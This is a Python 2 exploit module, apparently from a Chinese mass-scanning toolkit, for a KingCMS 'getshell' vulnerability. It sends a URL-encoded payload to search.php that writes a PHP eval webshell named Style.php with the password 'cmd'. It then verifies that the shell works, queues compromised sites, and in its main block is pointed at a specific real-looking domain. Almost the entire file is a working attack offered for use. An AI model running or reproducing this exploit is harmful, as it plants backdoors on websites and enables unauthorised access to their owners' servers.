#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##############################kingcms Getshell漏洞###########################
#参考http://www.wooyun.org/bugs/wooyun-2010-09469
import urllib2
import sys
import threading
sys.path.append('..')
import Class_Queue
import yijuhua_CS

class kingcms_getshell(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        self.scan("http://"+self.url)
        #print "%s close--kingcms_getshell!!!!!"%(self.url)

    def scan(self,arg):
        url = arg+'/search.php?query=shaoxiao%27%3B%3F%3E%3C%3F%66%70%75%74%73%28%66%6F%70%65%6E%28%27%53' \
                  '%74%79%6C%65%2E%70%68%70%27%2C%27%77%27%29%2C%62%61%73%65%36%34%5F%64%65%63%6F%64%65%28%' \
                  '27%4D%54%45%78%50%44%39%77%61%48%41%67%51%47%56%32%59%57%77%6F%4A%46%39%51%54%31%4E%55%57' \
                  '%79%64%6A%62%57%51%6E%58%53%6B%37%50%7A%34%79%4D%6A%49%3D%27%29%29%3B%3F%3E%26%6D%6F%64%65%' \
                  '6C%69%64%3D%31%20%6F%72%20%32%3D%32'
        #UrlDecode解码
        shellurl = arg+'/Style.php'
        try:
            html = urllib2.urlopen(url).read()
            #print html
            if 'shaoxiao' in html:
                shellhtml = urllib2.urlopen(shellurl).read()
                if '111222' in shellhtml:
                    if yijuhua_CS.yijuhua_cs("php",shellurl,"cmd"):   #ASP还是PHP  ,URL地址 ，密码
                    #是
                        EXP_list=[1,self.url,"exp","exp_kingcms_getshell",shellurl,"cmd","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                    else:
                    #否
                        EXP_list=[0,self.url,"exp","exp_kingcms_getshell",shellurl,"cmd","webshell"]
                        #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                        Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                    #print "exp_kingcms_getshell---%s---%s"%(shellurl,"webshell--pass:cmd")
        except Exception,e:
            #print e
            return 0

################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(kingcms_getshell("www.jinjuewiremesh.com"))

    for t in threads:
        t.start()














